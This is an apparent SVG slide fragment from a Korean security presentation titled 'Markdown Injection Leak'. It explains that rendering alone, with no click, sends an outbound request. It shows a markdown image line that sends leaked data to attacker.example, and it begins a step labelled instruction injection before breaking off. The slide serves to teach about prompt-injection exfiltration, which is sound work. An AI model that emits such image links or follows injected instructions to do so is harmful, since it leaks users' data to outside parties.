  <rect class="bg" width="1280" height="720"/>
  <rect class="chip" x="60" y="40" width="60" height="28" rx="14"/>
  <text class="chiptxt" x="90" y="60.0" text-anchor="middle">6-4</text>
  <text class="stitle" x="60" y="118.0" text-anchor="start">Markdown Injection Leak</text>
  <text class="ssub" x="60" y="154.0" text-anchor="start">클릭 없이 렌더링만으로 외부 요청이 나간다</text>
  <rect class="cmdbg" x="60" y="195" width="1160" height="60" rx="8"/>
  <text class="cmd" x="80" y="232.0" text-anchor="start">![img](https://attacker.example/pixel.png?q=&lt;유출 데이터&gt;)</text>
  <rect class="box" x="60" y="285" width="270" height="150" rx="10"/>
  <text class="tag" x="78" y="313.0" text-anchor="start">1단계</text>
  <text class="cname" x="78" y="343.0" text-anchor="start">지시 주입</text>
